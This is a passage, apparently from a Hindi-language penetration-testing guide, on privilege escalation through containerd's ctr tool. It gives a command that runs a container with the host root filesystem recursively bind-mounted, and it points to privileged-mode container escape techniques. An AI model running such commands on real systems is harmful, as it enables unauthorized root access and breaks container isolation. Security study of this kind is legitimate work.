...
**containerd** और **ctr` container stack में कहाँ फिट होते हैं**, यह जानने के लिए निम्नलिखित link पर जाएँ:
...
/usr/bin/ctr
```
आप containerd में ज्ञात images की सूची बना सकते हैं:<sup>[[2]](#references)</sup>
```bash
ctr image list
...
```
फिर उन **images में से एक को container root पर host root को recursively bind-mounted करके run करें**:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

एक container को privileged mode में चलाएँ और escape का परीक्षण करें।\
...
```
`--privileged` process को caller की effective Linux capabilities प्रदान करता है और कई isolation controls हटा देता है, लेकिन escape अभी भी environment-dependent रहता है; इसके लिए निम्नलिखित पेज में उल्लिखित techniques का उपयोग करके परीक्षण करें:<sup>[[5]](#references)</sup>
